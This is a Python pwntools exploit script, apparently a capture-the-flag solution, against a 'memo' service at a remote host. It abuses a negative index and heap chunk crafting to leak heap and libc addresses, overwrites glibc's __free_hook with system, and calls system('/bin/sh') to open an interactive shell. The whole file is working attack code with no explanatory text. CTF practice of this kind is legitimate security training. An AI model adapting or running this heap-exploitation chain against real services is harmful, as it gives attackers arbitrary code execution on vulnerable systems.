#!/usr/bin/python

from pwn import *
import time


def list_memo(s):
  s.sendline("1")
  return s.recvuntil("7. Exit\n")

def write_memo(s,memo):
  s.sendline("2")
  s.recvuntil("Input memo\n")
  if len(memo)==0x40:
    s.send(memo)
  else:
    s.sendline(memo)
  s.recvuntil("7. Exit\n")

def edit_memo(s,idx,memo):
  s.sendline("3")
  s.recvuntil("index\n")
  s.sendline("%d"%idx)
  s.recvuntil("memo\n")
  s.sendline(memo)
  s.recvuntil("7. Exit\n")

def delete_mem(s,idx):
  s.sendline("4")
  s.recvuntil("index\n")
  s.sendline("%d"%idx)
  s.recvuntil("7. Exit\n")

def save(s,idx,name):
  s.sendline("5")
  s.recvuntil("index\n")
  s.sendline("%d"%idx)
  s.recvuntil("name\n")
  s.sendline(name)
  s.recvuntil("7. Exit\n")

def load(s,name,start,end):
  s.sendline("6")
  s.recvuntil("name\n")
  s.sendline(name)
  s.recvuntil("pos")
  s.sendline("%d"%start)
  s.recvuntil("pos")
  s.sendline("%d"%end)
  s.recvuntil("7. Exit\n")

def init(s,name):
  s.recvuntil("(1/0)")
  s.sendline("1")
  s.recvuntil("ID\n")
  s.sendline(name)
  s.recvuntil("Exit\n")

def find_heapbase(s,user):
  for i in range(30):
    load(s,"core",0x1000*i+0x10,0x1000*i+0x20)
    if user in list_memo(s):
      delete_mem(s,0)
      return 0x1000*i+0x10
    else:
      delete_mem(s,0)

if __name__ == "__main__":
  #s = process("./memo")
  s = remote("memo.eatpwnnosleep.com",8888)
  s.recvuntil("(1/0)")
  s.sendline("0")
  s.recvuntil("User ID : ")
  user = s.recvuntil("\n")[:-1]
  s.info("USER : "+user)

  write_memo(s, p64(0)+p64(0x51)+p64(0x602fe0)+p64(0x40))
  write_memo(s, p64(0)+p64(0x51)+p64(0x6030a0)+p64(0x80))
  write_memo(s, p64(0)+p64(0x51)+p64(0x6030e0)+p64(0x80))
  write_memo(s,"AAAA")

  s.sendline("3")
  s.sendline("-1")
  time.sleep(0.3)
  s.close()

  #s = process("./memo")
  s = remote("memo.eatpwnnosleep.com",8888)

  s.recvuntil("(1/0)")
  s.sendline("1")
  s.recvuntil("ID\n")
  s.sendline(user)
  s.recvuntil("7. Exit\n")

  heap = find_heapbase(s, user)
  s.info("HEAP: "+hex(heap))
  #s.sendline("6")

  write_memo(s,"AAAA")
  write_memo(s,"AAAA")

  delete_mem(s,0)
  load(s, "core", heap+0x30,heap+0x30+0x60)
  libc = u64(list_memo(s).split("0.\n")[1][:8]) - 0x36e80
  system = libc+0x45390
  free_hook = libc+0x3c67a8
  s.info("LIBC: "+hex(libc))
  #delete_mem(s,0)
  #write_memo(s, p64(free_hook)+p64(0x40))
  #write_memo(s, p64(free_hook)+p64(0x40))
  #edit_memo(s, 1, 

  write_memo(s,"CCCC")
  write_memo(s,"CCCC")

  delete_mem(s,2)
  load(s, "core", heap+0x30+0x70,heap+0x30+0x70+0x60)

  write_memo(s,"DDDD")
  write_memo(s,"DDDD")
  delete_mem(s,4)
  load(s, "core", heap+0x30+0x70+0x70,heap+0x30+0x70+0x70+0x60)

  edit_memo(s, 4, p64(0)+p64(0x51)+p64(free_hook)+p64(0x40))

  save(s, 2, "asdf")

  #delete_mem(s,5)
  #delete_mem(s,3)
  #delete_mem(s,1)

  write_memo(s, "EEEE")
  write_memo(s,"EEEE")
  delete_mem(s,6)
  load(s, "asdf", 0, 0x80)
  #pause()
  edit_memo(s,6,p64(system))
  edit_memo(s,2,"/bin/sh\x00")
  s.sendline("4")
  s.sendline("2")
  s.interactive()
